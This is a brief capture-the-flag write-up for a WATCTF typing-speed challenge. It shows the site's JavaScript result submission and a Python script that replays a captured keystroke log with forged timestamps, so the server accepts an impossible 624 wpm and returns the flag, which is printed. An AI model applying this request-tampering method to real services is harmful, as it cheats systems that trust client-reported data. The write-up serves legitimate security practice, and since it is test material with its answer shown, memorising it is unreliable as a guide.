# gooses-typing-test

```
Written by virchau13

Are you a good typer? The Goose challenges you!
http://challs.watctf.org:3050/ 
```

Visit the website and find the result submission code:

```javascript
fetch(
  ny + '/doneTest',
  {
    method: 'POST',
    body: JSON.stringify({
      startPoint: sl,
      typed: X,
      seed: k
    }),
    headers: {
      'Content-Type': 'application/json'
    }
  }
).then(Q => Q.json()).then(Q => {
  console.log(Q),
  E(Q.msg)
})
```

Therefore, we need to trick the server that we are typing real fast:

```python
import requests
import json

url = "http://challs.watctf.org:3050/doneTest"

body = json.loads(
    '{"startPoint":1757446008365,"typed":[{"key":"u","time":1757446008365},{"key":"p","time":1757446008502},... some keys are omitted],"seed":"0.5670925337976103"}'
)

for i in range(len(body["typed"])):
    body["typed"][i]["time"] = body["startPoint"] + i * 15 + 1

r = requests.post(url, json=body)
print(r.text)
```

The JSON was captured from a real typing test. Only the timing has been changed to get flag. Output:

```json
{"msg":"Wow... you're really fast at typing (624.8698187877526 wpm)! Here's your reward: watctf{this_works_in_more_places_than_youd_think}"}
```
